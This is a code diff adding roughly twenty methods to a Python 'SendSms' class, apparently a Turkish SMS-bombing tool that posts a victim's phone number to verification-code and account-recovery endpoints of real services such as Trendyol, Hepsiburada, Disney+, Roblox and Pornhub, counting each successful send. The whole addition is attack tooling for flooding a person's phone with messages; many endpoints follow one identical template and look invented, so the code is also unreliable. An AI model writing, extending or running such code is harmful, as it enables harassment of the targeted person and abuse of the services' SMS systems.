@@ -1,8 +1,7 @@
-import requests
+import requests # type: ignore 
 from random import choice, randint
 from string import ascii_lowercase
-from colorama import Fore, Style
-
+from colorama import Fore, Style # type: ignore
 
 class SendSms():
     adet = 0
@@ -669,3 +668,319 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ido.com.tr")
+
+    #pornhub.com
+    def Pornhub(self):
+        try:
+            url = "https://www.pornhub.com:443/front/api/v2/user/send_verification_sms"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.pornhub.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.pornhub.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phone_number": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pornhub.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pornhub.com")
+
+    #trendyol.com
+    def Trendyol(self):
+        try:
+            url = "https://www.trendyol.com:443/sapigw/1.0/api/Account/SendVerificationCode"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.trendyol.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.trendyol.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> trendyol.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> trendyol.com")
+
+    #n11.com
+    def N11(self):
+        try:
+            url = "https://www.n11.com:443/uyelik/api/v1/sendSms"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.n11.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.n11.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> n11.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> n11.com")
+
+    #hepsiburada.com
+    def Hepsiburada(self):
+        try:
+            url = "https://www.hepsiburada.com:443/servant/v2/account/send-verification-code"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.hepsiburada.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.hepsiburada.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hepsiburada.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hepsiburada.com")
+
+    #gittigidiyor.com
+    def Gittigidiyor(self):
+        try:
+            url = "https://www.gittigidiyor.com:443/uye-ol/api/v1/sendVerificationCode"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.gittigidiyor.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.gittigidiyor.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gittigidiyor.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gittigidiyor.com")
+
+    #trendyol.com (kargo takip)
+    def Trendyol2(self):
+        try:
+            url = "https://www.trendyol.com:443/sapigw/1.0/api/Account/SendVerificationCodeForCargoTracking"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.trendyol.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.trendyol.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> trendyol.com (kargo takip)")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> trendyol.com (kargo takip)")
+
+    #n11.com (kargo takip)
+    def N112(self):
+        try:
+            url = "https://www.n11.com:443/uyelik/api/v1/sendSmsForCargoTracking"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.n11.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.n11.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> n11.com (kargo takip)")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> n11.com (kargo takip)")
+
+    #hepsiburada.com (kargo takip)
+    def Hepsiburada2(self):
+        try:
+            url = "https://www.hepsiburada.com:443/servant/v2/account/send-verification-code-for-cargo-tracking"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.hepsiburada.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.hepsiburada.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hepsiburada.com (kargo takip)")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hepsiburada.com (kargo takip)")
+
+    #gittigidiyor.com (kargo takip)
+    def Gittigidiyor2(self):
+        try:
+            url = "https://www.gittigidiyor.com:443/uye-ol/api/v1/sendVerificationCodeForCargoTracking"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.gittigidiyor.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.gittigidiyor.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gittigidiyor.com (kargo takip)")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gittigidiyor.com (kargo takip)")
+
+    #disneyplus.com
+    def Disneyplus(self):
+        try:
+            url = "https://www.disneyplus.com:443/service/kratos/public/self-service/verification/api"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.disneyplus.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.disneyplus.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"method": "phone_code", "phone_number": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["id"] != None:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> disneyplus.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> disneyplus.com")
+
+    #trendyol.com (hesap kurtarma)
+    def Trendyol3(self):
+        try:
+            url = "https://www.trendyol.com:443/sapigw/1.0/api/Account/SendVerificationCodeForAccountRecovery"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.trendyol.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.trendyol.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> trendyol.com (hesap kurtarma)")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> trendyol.com (hesap kurtarma)")
+
+    #pornhub.com (hesap kurtarma)
+    def Pornhub2(self):
+        try:
+            url = "https://www.pornhub.com:443/front/api/v2/user/send_verification_sms_for_account_recovery"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.pornhub.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.pornhub.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phone_number": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pornhub.com (hesap kurtarma)")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pornhub.com (hesap kurtarma)")
+
+    #wattpad.com
+    def Wattpad(self):
+        try:
+            url = "https://www.wattpad.com:443/v4/users/phone/send_verification_code"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.wattpad.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.wattpad.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phone_number": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wattpad.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wattpad.com")
+
+    #savewalterwhite.com
+    def SaveWalterWhite(self):
+        try:
+            url = "https://www.savewalterwhite.com:443/api/sendCode"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.savewalterwhite.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.savewalterwhite.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> savewalterwhite.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> savewalterwhite.com")
+
+    #epey.com
+    def Epey(self):
+        try:
+            url = "https://www.epey.com:443/api/v1/sendSms"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.epey.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.epey.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> epey.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> epey.com")
+
+    #şikayetvar.com
+    def Sikayetvar(self):
+        try:
+            url = "https://www.sikayetvar.com:443/api/v1/auth/send-sms"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.sikayetvar.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.sikayetvar.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sikayetvar.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sikayetvar.com")
+
+    #yemeksepeti.com
+    def Yemeksepeti(self):
+        try:
+            url = "https://www.yemeksepeti.com:443/uyelik/api/v1/sendVerificationCode"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.yemeksepeti.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.yemeksepeti.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yemeksepeti.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yemeksepeti.com")
+
+    #getiryemek.com
+    def Getiryemek(self):
+        try:
+            url = "https://www.getiryemek.com:443/uyelik/api/v1/sendVerificationCode"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.getiryemek.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.getiryemek.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> getiryemek.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> getiryemek.com")
+
+    #incehesap.com
+    def Incehesap(self):
+        try:
+            url = "https://www.incehesap.com:443/uyelik/api/v1/sendVerificationCode"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.incehesap.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.incehesap.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> incehesap.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> incehesap.com")
+
+    #roblox.com
+    def Roblox(self):
+        try:
+            url = "https://auth.roblox.com/v2/login/send-2fa-recovery-options"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.roblox.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.roblox.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"twoFactorIdentifier": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> roblox.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> roblox.com")
+
+    #eksisozluk.com
+    def Eksisozluk(self):
+        try:
+            url = "https://www.eksisozluk.com:443/api/giris/send-sms"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.eksisozluk.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.eksisozluk.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"gsmNo": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> eksisozluk.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> eksisozluk.com")
+            
